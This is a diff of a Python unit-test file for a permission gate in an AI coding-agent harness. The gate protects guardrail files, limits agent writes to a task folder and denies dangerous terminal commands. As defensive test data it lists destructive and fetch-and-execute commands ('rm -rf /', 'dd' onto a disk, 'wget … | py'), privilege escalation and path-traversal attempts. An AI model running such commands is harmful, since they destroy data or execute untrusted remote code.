@@ -1,4 +1,4 @@
-"""Gate (B6, M3-1): guardrail files, the L3 write scope, dangerous terminal commands. It never blocks a read."""
+"""Gate: guardrail files, the write scope of a task, dangerous terminal commands. It never blocks a read."""
 
 from __future__ import annotations
 
@@ -103,8 +103,6 @@ class GuardrailPolicyTests(unittest.TestCase):
             change(terminal_section)
             with self.assertRaises(ValueError):
                 gate_policy.validate_policy(dict(POLICY, terminal=terminal_section))
-        with self.assertRaises(ValueError):
-            gate_policy.validate_policy(dict(POLICY, l3_write_root=".workspace/sandbox"))
 
     def test_every_guardrail_path_matches(self) -> None:
         for relative, expected in {
@@ -113,7 +111,7 @@ class GuardrailPolicyTests(unittest.TestCase):
             ".harness/engine/core/state.py": True,
             ".harness/bin/harness": True,
             ".harness/bin/harness.cmd": True,
-            ".harness/policies/task-levels.json": True,
+            ".harness/policies/task.json": True,
             ".harness/registry.json": True,
             ".harness/runtime/state/vscode/s.json": True,
             ".vscode/settings.json": True,
@@ -125,7 +123,7 @@ class GuardrailPolicyTests(unittest.TestCase):
             "AGENTS.md": False,
             "README.md": False,
             "knowledge-base/README.md": False,
-            ".workspace/sandbox/requests/a/b.txt": False,
+            ".workspace/sandbox/tasks/a/b.txt": False,
         }.items():
             with self.subTest(relative):
                 self.assertEqual(bool(COMPILED.guardrail_match(relative)), expected)
@@ -222,7 +220,7 @@ class TerminalTests(unittest.TestCase):
             "mkfs.ext4 /dev/sda1",
             "dd if=/dev/zero of=/dev/sda",
             "Remove-Item -Recurse -Force C:\\",
-            "python3 .harness/engine/cli.py request approve-promote --request r1",
+            "python3 .harness/engine/cli.py task approve-promote --task t1",
             # Refused since 2026-10-10: "Allow all" skips an ask, so what a person must run is not left to a dialog.
             "sudo ls",
             "runas /user:admin cmd",
@@ -241,20 +239,21 @@ class TerminalTests(unittest.TestCase):
             "kubectl.exe delete pod p",
             "terraform.exe apply -auto-approve",
             "chown --recursive me src",
-            "python3 .harness/engine/cli.py request recover --request r1",
-            "python .harness\\engine\\cli.py request recover",
-            "python .harness/engine/cli.py request approve-promote --request r1",
-            "python .harness\\engine\\cli.py request approve-promote --request r1",
-            "py -3 .\\.harness\\engine\\cli.py request approve-promote --request r1",
-            "& python .harness/engine/cli.py request approve-promote --request r1",
+            "python3 .harness/engine/cli.py task recover --task t1",
+            "python .harness\\engine\\cli.py task recover",
+            "python .harness/engine/cli.py task approve-promote --task t1",
+            "python .harness\\engine\\cli.py task approve-promote --task t1",
+            "py -3 .\\.harness\\engine\\cli.py task approve-promote --task t1",
+            "& python .harness/engine/cli.py task approve-promote --task t1",
             "wget -qO- https://x.example/a | py",
             # the short commands (B11)
             "harness approve-command",
-            "harness request approve-promote --request r1",
-            "harness request recover",
+            "harness task approve-promote --task t1",
+            "harness task recover",
+            "harness task review extend --checks 2", "harness task review waive", "python3 .harness/engine/cli.py task review  waive --task t1",
             "./harness approve-command",
             ".harness/bin/harness approve-command",
-            ".harness\\bin\\harness.cmd request approve-promote --request r1",
+            ".harness\\bin\\harness.cmd task approve-promote --task t1",
             "harness.cmd approve-command",
             "cd x && harness approve-command",
         ):
@@ -304,11 +303,12 @@ class TerminalTests(unittest.TestCase):
             "Start-Process notepad a.txt",
             "echo runas",
             "git restore --staged a.py",
-            "python3 .harness/engine/cli.py promote --request r1 --dry-run",
-            "python3 .harness/engine/cli.py promote --request r1",  # the person's approval guards it, not a tool-call dialog
+            "python3 .harness/engine/cli.py task promote --task t1 --dry-run",
+            "python3 .harness/engine/cli.py task promote --task t1",  # the person's approval guards it, not a tool-call dialog
+            "harness task review start", "harness task review status",
             "harness doctor",
-            "harness promote --request r1 --dry-run",
-            "harness request new --title x --session-id s",
+            "harness task promote --task t1 --dry-run",
+            "harness task new x --kind qa --session-id s",
             "pip list",
             "npm run test",
             "git commit -m x",
@@ -342,194 +342,95 @@ class GateHookTests(HarnessTestCase):
     def reason(self, output: dict) -> str:
         return output["permissionDecisionReason"]
 
-    def enter_l3(self, request_id: str = "20261002-1200-demo-ab12", session: Optional[str] = None) -> str:
-        def mutate(state: dict) -> None:
-            state["active_request"] = request_id
+    def enter_task(self, name: str = "job", session: Optional[str] = None) -> str:
+        """The session picks up a new task (kind dev, so it has DEV/). Returns the task folder."""
+        session = session or self.session
+        self.hook(payload("UserPromptSubmit", session, prompt="work"))
+        self.cli_json("task", "new", name, "--kind", "dev", "--session-id", session)
+        return f".workspace/sandbox/tasks/{name}"
 
-        update_state(self.root, "vscode", session or self.session, mutate)
-        return request_id
+    # --- the write scope of a task ------------------------------------------------------------
 
-    # --- guardrail files ----------------------------------------------------------------------
-
-    def test_every_edit_tool_is_denied_on_a_guardrail_file_at_every_level(self) -> None:
-        cases = [
-            ("create_file", {"filePath": self.path(GUARD), "content": "{}"}),
-            ("replace_string_in_file", {"filePath": self.path(".harness/engine/hook.py"), "oldString": "a", "newString": "b"}),
-            ("replace_string_in_file", {"filePath": ".github/hooks/harness.json", "oldString": "a", "newString": "b"}),
-            ("create_file", {"filePath": ".harness\\registry.json", "content": "{}"}),
-            ("create_file", {"filePath": self.path(".harness/runtime/state/vscode/x.json"), "content": "{}"}),
-            ("replace_string_in_file", {"filePath": self.path(".vscode/settings.json"), "oldString": "true", "newString": "false"}),
-            ("multi_replace_string_in_file", {"replacements": [
-                {"filePath": self.path("README.md"), "oldString": "a", "newString": "b"},
-                {"filePath": self.path(GUARD), "oldString": "a", "newString": "b"}]}),
-            ("apply_patch", {"input": f"*** Begin Patch\n*** Update File: {GUARD}\n@@\n-a\n+b\n*** End Patch"}),
-            ("insert_edit_into_file", {"filePath": self.path(".harness/engine/core/state.py"), "code": "x"}),
-        ]
-        for level in (1, 2):
-            session = f"guard-l{level}"
-            self.hook(payload("UserPromptSubmit", session, prompt=f"[L{level}] work"))
-            for tool, tool_input in cases:
-                with self.subTest(f"L{level} {tool} {list(tool_input.values())[0]!s:.50}"):
-                    output = self.pre(tool, tool_input, session)
-                    self.assertEqual(self.decision(output), "deny", output)
-                    self.assertIn("guardrail", self.reason(output))
-
-    def test_the_reason_says_which_file_and_what_to_do(self) -> None:
-        output = self.pre("create_file", {"filePath": self.path(GUARD), "content": "{}"})
-        reason = self.reason(output)
-        self.assertIn(GUARD, reason)
-        self.assertIn("告诉用户", reason)
-
-    def test_case_and_dot_dot_do_not_get_past_the_gate(self) -> None:
-        for raw in (self.path(".HARNESS/Policies/GATE.json"), self.path("docs/../.harness/policies/gate.json"), self.path("./.harness//policies/gate.json")):
-            with self.subTest(raw):
-                self.assertEqual(self.decision(self.pre("create_file", {"filePath": raw, "content": ""})), "deny")
-
-    def test_other_paths_are_written_normally(self) -> None:
-        for relative in (
-            "README.md", "AGENTS.md", ".github/copilot-instructions.md", ".github/skills/l2/SKILL.md",
-            ".harness/tests/test_x.py", ".harness/eval/fixtures/a.json", "knowledge-base/doc.md",
-            ".workspace/sandbox/probe/a.txt", ".workspace/current_tasks/r.md",
-        ):
-            with self.subTest(relative):
-                output = self.pre("create_file", {"filePath": self.path(relative), "content": "x"})
-                self.assertEqual(output, {})
-
-    def test_a_path_outside_the_repo_is_not_the_gates_business_at_l1_and_l2(self) -> None:
-        self.assertEqual(self.pre("create_file", {"filePath": "/tmp/elsewhere.txt", "content": "x"}), {})
-
-    def test_reads_are_never_blocked(self) -> None:
-        for relative in (GUARD, ".harness/engine/hook.py", ".github/hooks/harness.json", ".harness/runtime/logs/vscode/session.jsonl",
-                         ".github/skills/l2/SKILL.md", "knowledge-base/README.md"):
-            with self.subTest(relative):
-                self.assertEqual(self.pre("read_file", {"filePath": self.path(relative)}), {})
-                self.assertEqual(self.pre("list_dir", {"path": self.path(relative)}), {})
-        self.assertEqual(self.pre("grep_search", {"query": "gate", "includePattern": ".harness/policies/**"}), {})
-        self.assertEqual(self.pre("run_in_terminal", {"command": "cat .harness/policies/gate.json"}), {})
-
-    def test_a_write_call_with_no_readable_path_is_allowed(self) -> None:
-        self.assertEqual(self.pre("create_file", {"content": "x"}), {})
-        self.assertEqual(self.pre("apply_patch", {"input": "not a patch"}), {})
-
-    # --- terminal -----------------------------------------------------------------------------
-
-    def test_terminal_decisions(self) -> None:
-        output = self.pre("run_in_terminal", {"command": "echo x > .harness/policies/gate.json"})
-        self.assertEqual(self.decision(output), "deny")
-        self.assertIn("guardrail", self.reason(output))
-        self.assertEqual(self.decision(self.pre("run_in_terminal", {"command": "rm -rf /"})), "deny")
-        output = self.pre("run_in_terminal", {"command": "git push origin main"})
-        self.assertEqual(self.decision(output), "ask")
-        self.assertIn("需要用户确认", self.reason(output))
-        self.assertEqual(self.pre("run_in_terminal", {"command": "git status"}), {})
-
-    def test_the_level_set_rule_of_task_level_still_applies_next_to_the_gate(self) -> None:
-        output = self.pre("run_in_terminal", {"command": "python3 .harness/engine/cli.py level set --session-id s --level 2"})
-        self.assertEqual(self.decision(output), "deny")
-        self.assertIn("只有用户能切换", self.reason(output))
-
-    def test_two_modules_denying_the_same_call_both_explain(self) -> None:
-        # L1 has used up its searches (task_level denies); the gate has nothing to say about a search.
-        self.hook(payload("UserPromptSubmit", "both", prompt="work"))
-        for _ in range(2):
-            self.assertEqual(self.pre("grep_search", {"query": "a"}, "both"), {})
-        self.assertEqual(self.decision(self.pre("grep_search", {"query": "a"}, "both")), "deny")
-
-    # --- L3 write scope -----------------------------------------------------------------------
-
-    def test_l3_allows_writes_inside_the_request_folder_only(self) -> None:
-        request = self.enter_l3()
-        inside = f".workspace/sandbox/requests/{request}"
-        for relative in (f"{inside}/builder/outputs/a.py", f"{inside}/x.md", f"{inside}/deep/er/y.txt"):
+    def test_a_task_allows_writes_inside_its_folder_only(self) -> None:
+        inside = self.enter_task()
+        for relative in (f"{inside}/RCA.md", f"{inside}/x.md", f"{inside}/deep/er/y.txt", f"{inside}/TEST/case.md"):
             with self.subTest(relative):
                 self.assertEqual(self.pre("create_file", {"filePath": self.path(relative), "content": "x"}), {})
-        for relative in ("README.md", ".workspace/sandbox/requests/other-id/a.txt", ".workspace/sandbox/probe/a.txt",
-                         f".workspace/sandbox/requests/{request}-evil/a.txt", ".workspace/current_tasks/r.md", "src/app.py"):
+        for relative in ("README.md", ".workspace/sandbox/tasks/other/a.txt", ".workspace/sandbox/probe/a.txt",
+                         f"{inside}-evil/a.txt", ".workspace/goals/r.md", "src/app.py"):
             with self.subTest(relative):
                 output = self.pre("replace_string_in_file", {"filePath": self.path(relative), "oldString": "a", "newString": "b"})
                 self.assertEqual(self.decision(output), "deny")
                 self.assertIn(f"{inside}/", self.reason(output))
-                self.assertIn("promote", self.reason(output))
 
-    def test_l3_denies_dot_dot_out_of_the_request_folder_and_paths_outside_the_repo(self) -> None:
-        request = self.enter_l3()
-        inside = f".workspace/sandbox/requests/{request}"
+    def test_a_task_denies_dot_dot_out_of_its_folder_and_paths_outside_the_repo(self) -> None:
+        inside = self.enter_task()
         for raw in (self.path(f"{inside}/../../../../README.md"), f"{inside}/../x.txt", "/tmp/a.txt", "~/a.txt"):
             with self.subTest(raw):
                 self.assertEqual(self.decision(self.pre("create_file", {"filePath": raw, "content": "x"})), "deny")
 
-    def test_l3_still_protects_guardrail_files_first(self) -> None:
-        self.enter_l3()
+    def test_a_task_still_protects_guardrail_files_first(self) -> None:
+        self.enter_task()
         output = self.pre("create_file", {"filePath": self.path(GUARD), "content": "{}"})
         self.assertIn("guardrail", self.reason(output))
 
-    def test_l3_does_not_limit_reads_or_the_terminal_paths(self) -> None:
-        self.enter_l3()
+    def test_a_task_does_not_limit_reads_or_the_terminal_paths(self) -> None:
+        self.enter_task()
         self.assertEqual(self.pre("read_file", {"filePath": self.path("README.md")}), {})
         self.assertEqual(self.pre("read_file", {"filePath": self.path(GUARD)}), {})
         self.assertEqual(self.pre("run_in_terminal", {"command": "echo x > README.md"}), {})  # a limit the README admits
         self.assertEqual(self.decision(self.pre("run_in_terminal", {"command": "git push"})), "ask")
 
-    def test_l3_applies_to_a_nested_edit_list_and_a_patch(self) -> None:
-        request = self.enter_l3()
-        inside = f".workspace/sandbox/requests/{request}"
+    def test_the_scope_applies_to_a_nested_edit_list_and_a_patch(self) -> None:
+        inside = self.enter_task()
         output = self.pre("multi_replace_string_in_file", {"replacements": [
             {"filePath": self.path(f"{inside}/a.py")}, {"filePath": self.path("README.md")}]})
         self.assertEqual(self.decision(output), "deny")
         output = self.pre("apply_patch", {"input": f"*** Begin Patch\n*** Add File: {inside}/n.py\n+x\n*** End Patch"})
         self.assertEqual(output, {})
 
-    def test_l1_and_l2_do_not_use_the_sandbox_rule(self) -> None:
+    def test_without_a_task_there_is_no_scope_rule(self) -> None:
         self.assertEqual(self.pre("create_file", {"filePath": self.path("README.md"), "content": "x"}), {})
-
-    def test_an_unsafe_request_id_denies_every_write(self) -> None:
-        self.enter_l3("../escape")
-        output = self.pre("create_file", {"filePath": self.path("README.md"), "content": "x"})
-        self.assertEqual(self.decision(output), "deny")
-        self.assertIn("不合法", self.reason(output))
 
     # --- files only the CLI writes --------------------------------------------------------------
 
     def test_cli_owned_files_cannot_be_written_by_the_agent(self) -> None:
-        request = self.enter_l3()
-        inside = f".workspace/sandbox/requests/{request}"
-        for relative in (f"{inside}/request.json", f"{inside}/handoffs/builder/attempt-001/handoff.json",
-                         f"{inside}/handoffs/orchestrator/attempt-002/to-builder/manifest.json"):
+        inside = self.enter_task()
+        for relative in (f"{inside}/.task/task.json", f"{inside}/REVIEW/round-001/verdict.md", f"{inside}/SNAPSHOT/plan-1/manifest.json",
+                         f"{inside}/CHANGES.diff", f"{inside}/PROMOTE-PLAN.diff"):
             with self.subTest(relative):
                 output = self.pre("create_file", {"filePath": self.path(relative), "content": "{}"})
                 self.assertEqual(self.decision(output), "deny")
                 self.assertIn("由 CLI 生成", self.reason(output))
                 self.assertIn("`harness`", self.reason(output))
-        # other files in the request folder stay writable
-        for relative in (f"{inside}/orchestrator/plan.md", f"{inside}/builder/outputs/attempt-001/request.json.md"):
+        # other files in the task folder stay writable
+        for relative in (f"{inside}/TASK.md", f"{inside}/notes/task.json.md"):
             with self.subTest(relative):
                 self.assertEqual(self.pre("create_file", {"filePath": self.path(relative), "content": "x"}), {})
 
-    def test_cli_owned_files_are_denied_at_l1_too_and_in_terminal_writes(self) -> None:
-        owned = ".workspace/sandbox/requests/r1/request.json"
+    def test_cli_owned_files_are_denied_without_a_task_too_and_in_terminal_writes(self) -> None:
+        owned = ".workspace/sandbox/tasks/t1/.task/task.json"
         output = self.pre("replace_string_in_file", {"filePath": self.path(owned), "oldString": "a", "newString": "b"})
         self.assertIn("由 CLI 生成", self.reason(output))
         for command in (f"echo '{{}}' > {owned}", f"sed -i 's/a/b/' {owned}", f"rm {owned}",
-                        "tee .workspace/sandbox/requests/r1/handoffs/builder/attempt-001/handoff.json"):
+                        "tee .workspace/sandbox/tasks/t1/REVIEW/round-001/verdict.md", "rm -r .workspace/reports/task-t1.md"):
             with self.subTest(command):
                 output = self.pre("run_in_terminal", {"command": command})
                 self.assertEqual(self.decision(output), "deny")
                 self.assertIn("CLI", self.reason(output))
-        for command in (f"cat {owned}", f"python3 .harness/engine/cli.py handoff submit --request r1 > /tmp/out.txt",
-                        "ls .workspace/sandbox/requests/r1/"):
+        for command in (f"cat {owned}", "python3 .harness/engine/cli.py task status > /tmp/out.txt", "ls .workspace/sandbox/tasks/t1/"):
             with self.subTest(command):
                 self.assertEqual(self.pre("run_in_terminal", {"command": command}), {})
 
-
     # --- subagents ----------------------------------------------------------------------------
 
-    def test_a_subagent_session_inherits_the_gate_through_the_shared_state(self) -> None:
-        request = self.enter_l3()
-        # Legacy engine: the subagent's tool calls arrive on the parent's session.
-        self.hook(subagent_start(self.session, "builder"))
-        output = self.pre("create_file", {"filePath": self.path("README.md"), "content": "x"})
+    def test_a_subagent_session_inherits_the_scope_of_its_parents_task(self) -> None:
+        inside = self.enter_task()
+        self.hook(subagent_start(self.session, "reviewer"))
+        self.hook(payload("UserPromptSubmit", "gate-child", prompt="检查评审包"))
+        output = self.pre("create_file", {"filePath": self.path("README.md"), "content": "x"}, "gate-child")
         self.assertEqual(self.decision(output), "deny")
-        self.assertEqual(self.pre("create_file", {"filePath": self.path(f".workspace/sandbox/requests/{request}/a"), "content": "x"}), {})
+        self.assertEqual(self.pre("create_file", {"filePath": self.path(f"{inside}/a"), "content": "x"}, "gate-child"), {})
 
     # --- the Copilot SDK engine ---------------------------------------------------------------
 
@@ -553,11 +454,11 @@ class GateHookTests(HarnessTestCase):
         self.assertEqual(self.sdk("Write", {"path": self.path(".workspace/sandbox/b6/a.txt"), "file_text": "x"}), {})
         self.assertEqual(self.sdk("Bash", {"command": "ls -la", "description": "x"}), {})
 
-    def test_sdk_engine_l3_scope(self) -> None:
-        request = self.enter_l3(session="sdk-l3")
-        ok = self.sdk("Write", {"path": self.path(f".workspace/sandbox/requests/{request}/a.txt"), "file_text": "x"}, "sdk-l3")
+    def test_sdk_engine_task_scope(self) -> None:
+        inside = self.enter_task(session="sdk-task")
+        ok = self.sdk("Write", {"path": self.path(f"{inside}/a.txt"), "file_text": "x"}, "sdk-task")
         self.assertEqual(ok, {})
-        bad = self.sdk("Write", {"path": self.path("README.md"), "file_text": "x"}, "sdk-l3")
+        bad = self.sdk("Write", {"path": self.path("README.md"), "file_text": "x"}, "sdk-task")
         self.assertEqual(bad["permissionDecision"], "deny")
 
     def test_recorded_payloads_with_the_path_swapped_for_a_guardrail_file(self) -> None:
@@ -571,7 +472,7 @@ class GateHookTests(HarnessTestCase):
                 data = json.loads((REPO / ".harness" / "eval" / "fixtures" / "hooks" / name).read_text(encoding="utf-8"))
                 self.assertIn(recorded, data["tool_input"][key])
                 self.assertEqual(self.hook(dict(data, cwd=self.base)), {})  # a sandbox path: outside this temp root, allowed
-                data["tool_input"][key] = f"{self.base}/.harness/policies/task-levels.json"
+                data["tool_input"][key] = f"{self.base}/.harness/policies/task.json"
                 output = self.hook(dict(data, cwd=self.base))
                 self.assertIn("deny", json.dumps(output))
 
